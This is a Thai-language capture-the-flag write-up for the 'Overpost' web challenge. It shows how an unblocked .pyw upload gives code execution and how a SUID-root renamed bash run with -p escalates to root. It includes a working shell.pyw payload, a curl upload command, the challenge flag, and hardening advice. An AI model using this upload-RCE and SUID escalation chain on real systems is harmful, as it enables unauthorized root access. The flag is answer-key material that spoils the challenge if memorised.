# Overpost (Web, 300pts)

**Flag:** `CYBERHEROCTF{overpost_1be6dbddb4163f8b495266d3}`
**สถานะ:** ✅ ยืนยันกับระบบแล้ว
**หมวดย่อย:** Web → RCE → Linux Privilege Escalation
**ไฟล์โจทย์:** `VM-Overpost.7z` (password-protected, ต้อง boot หรือ mount ดิสก์เอง)

---

## 📜 โจทย์

มีเว็บแอปแชร์ไฟล์ (file-sharing portal) ให้มาเป็น VM ทั้งเครื่อง พัฒนาบอกว่า
"ระบบบล็อกไฟล์อันตรายไว้แล้ว" โจทย์ให้หาไฟล์ที่ **ไม่ควรจะรันได้ แต่รันได้**
เมื่อรันได้แล้วให้ไต่สิทธิ์ไปยังบัญชีที่เป็นเจ้าของเครื่อง แล้วตอบ flag

---

## 🔍 ขั้นตอนการแก้

### 1. แกะไฟล์ VM แบบ Offline (ไม่ต้อง boot)

```bash
# แตกไฟล์ VM
7z x -p<password> VM-Overpost.7z -oE:\Overpost
```

อ่านไฟล์ `.vmx` เพื่อหาดิสก์ลูกท้ายของ backing chain:

```text
scsi0:0.fileName = "Overpost-000002.vmdk"
guestOS          = "ubuntu-64"
```

แล้วเชื่อมดิสก์แบบ **read-only** ด้วย qemu-nbd (ไม่ต้อง boot เครื่องเลย):

```bash
sudo qemu-img info Overpost-000002.vmdk      # ดู backing chain
sudo modprobe nbd max_part=16
sudo qemu-nbd -r -c /dev/nbd0 Overpost-000002.vmdk
sudo blkid /dev/nbd0*                        # เห็น LVM PV
sudo pvscan && sudo vgchange -ay ubuntu-vg
sudo mount -o ro /dev/ubuntu-vg/ubuntu-lv /mnt/ovroot
```

> **กับดักที่เจอบ่อย:** ถ้ามี VM อีกเครื่องที่ชื่อ VG เดียวกันถูกเปิดอยู่ จะเจอ
> duplicate VG collision → ปิดตัวเก่าก่อน (`sudo vgchange -an <vg>`, `sudo qemu-nbd -d /dev/nbdN`)
> หรือใช้ `dmsetup` map LV แบบ manual

### 2. อ่านซอร์สโค้ดแอป

```bash
cat /mnt/ovroot/opt/overpost/challenge/app.py
cat /mnt/ovroot/etc/systemd/system/overpost.service
```

จุดที่พังอยู่ในสองลิสต์นี้:

```python
BLOCKED    = (".py", ".sh", ".php", ".cgi", ".pl", ".rb")
EXECUTABLE = (".py", ".pyw")
```

และตอนรับไฟล์:

```python
if name.lower().endswith(EXECUTABLE):
    subprocess.run([sys.executable, fp], cwd=UPLOAD_DIR, timeout=8)
```

👉 **`.pyw` อยู่ในลิสต์ EXECUTABLE แต่ไม่อยู่ในลิสต์ BLOCKED**
ผู้พัฒนาเขียนลิสต์ดำด้วยการ "พิมพ์นามสกุลที่คิดออก" จึงลืม `.pyw`
ผลคืออัปโหลดไฟล์ `.pyw` = **รันโค้ดได้ทันที** ในสิทธิ์ของ user `overpost`

### 3. เตรียมช่องทางยกระดับสิทธิ์

จาก service unit:

```ini
User=overpost
Environment=PORT=8005
Environment=DATA_DIR=/var/lib/overpost
WorkingDirectory=/opt/overpost/challenge
```

unit นี้ **ไม่มี** `NoNewPrivileges=yes` และไม่ drop capability ใด ๆ
→ binary ที่มี SUID bit ยังทำงานได้ตามปกติหลัง RCE

หา SUID ในเครื่อง:

```bash
find / -perm -4000 -type f 2>/dev/null
# /usr/local/bin/maintenance
```

ตรวจดูว่ามันคืออะไรจริง ๆ:

```bash
file /usr/local/bin/maintenance
strings -a /usr/local/bin/maintenance | grep -i "bash\|version"
```

→ มันคือ **GNU bash 5.2.21 ที่ถูกเปลี่ยนชื่อ** (SUID root)

### 4. โจมตี

อัปโหลดไฟล์ `shell.pyw` ผ่านหน้า upload ของเว็บ:

```python
import subprocess

r = subprocess.run(
    ["/usr/local/bin/maintenance", "-p", "-c", "id; echo '---'; cat /root/flag.txt"],
    capture_output=True, text=True, timeout=7
)
print(r.stdout)
print(r.stderr)
```

เหตุผลที่ต้องมี `-p`: bash จะ **ทิ้งสิทธิ์ SUID** ถ้าไม่ใส่ flag นี้
(`-p` = privileged mode, รักษา euid ไว้)

ลำดับสิทธิ์ที่ได้:

```text
overpost  →  (SUID bash)  →  euid = 0  →  อ่าน /root/flag.txt
```

### 5. ได้ flag

`/root/flag.txt` เป็นโหมด `600 root:root` — อ่านได้เฉพาะ root

```text
CYBERHEROCTF{overpost_1be6dbddb4163f8b495266d3}
```

> **หมายเหตุสำหรับคนที่ทำแบบ offline:** เนื่องจากเราต่อดิสก์เป็น root บนเครื่องตัวเอง
> จึงอ่านไฟล์ `/root/flag.txt` ได้ตรง ๆ จากที่ mount ด้วย
> แต่เส้นทางที่โจทย์ออกแบบไว้คือ **RCE ผ่าน `.pyw` → SUID bash → root**
> (ยืนยันได้จากไฟล์ `shell.pyw` ที่ผู้เขียนโจทย์ลืมไว้ใน `/var/lib/overpost/uploads/`
> ซึ่งใช้เทคนิคเดียวกันเป๊ะ)

---

## 🧠 หลักการที่ต้องเข้าใจ

| แนวคิด | คำอธิบาย |
|---|---|
| **Blacklist ≠ Security** | ลิสต์นามสกุลไฟล์ที่ "ห้าม" ต้องสมบูรณ์แบบ 100% ถ้าลืมตัวเดียวก็จบ ควรใช้ allowlist |
| **SUID + bash `-p`** | bash รักษา euid เมื่อรันด้วย `-p` เท่านั้น (ถ้าเป็น SUID โดยไม่มี `-p` จะลดสิทธิ์ลงเอง) |
| **Service hardening** | ไม่ตั้ง `NoNewPrivileges=yes` / ไม่ drop `CAP_*` → SUID ยังใช้ได้หลัง RCE |
| **Offline Forensics** | mount ดิสก์ read-only ทำให้เห็น config, source, unit file, ร่องรอยที่ผู้เขียนลืมไว้ |

---

## 🛠️ Exploit (สรุปเป็นคำสั่ง)

```bash
# 1) อัปโหลด (สมมติ endpoint คือหน้า upload ของพอร์ทัล)
curl -s -F "file=@shell.pyw" http://<overpost-host>:8005/upload

# 2) อ่านผลลัพธ์จากหน้า response (หรือจาก /var/lib/overpost/uploads/)
#    ต้องเห็น  uid=... euid=0(root)  และ flag ตามมา
```

```python
# shell.pyw
import subprocess
print(subprocess.run(
    ["/usr/local/bin/maintenance", "-p", "-c", "id; cat /root/flag.txt"],
    capture_output=True, text=True, timeout=7).stdout)
```

---

## ✅ สรุป

ช่องโหว่คือ **การบล็อกนามสกุลไฟล์ที่ไม่ครบถ้วน** (ลืม `.pyw`) ประกอบกับ
**SUID bash ที่ไม่ได้ป้องกันหลัง RCE** ทำให้จาก "อัปโหลดไฟล์" กลายเป็น "root ทั้งเครื่อง"

ถ้าจะแก้ให้ปลอดภัยจริง ต้อง:
1. ใช้ **allowlist** นามสกุล + ตรวจ MIME จริง + ตรวจ magic byte
2. เก็บไฟล์อัปโหลดไว้นอก web root และ **ห้าม execute เด็ดขาด**
3. ใส่ `NoNewPrivileges=yes`, `PrivateTmp=yes`, `ProtectSystem=strict` ใน systemd unit
4. เอา SUID ออกจาก binary ที่ไม่จำเป็น (โดยเฉพาะ shell!)
